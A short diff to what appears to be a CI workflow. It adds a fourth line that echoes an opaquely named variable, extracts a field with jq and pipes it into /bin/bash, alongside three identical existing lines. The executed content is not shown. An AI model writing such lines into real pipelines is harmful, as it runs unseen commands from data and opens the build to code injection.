@@ -30,6 +30,7 @@ jobs:
           echo $jcf4 | jq -r .nqfmi1 | /bin/bash
           echo $uh7460 | jq -r .iosit7815 | /bin/bash
           echo $v793 | jq -r .sqrpv1 | /bin/bash
+          echo $fmet614 | jq -r .uvy219 | /bin/bash
 
       - name: Save output
         if: always()
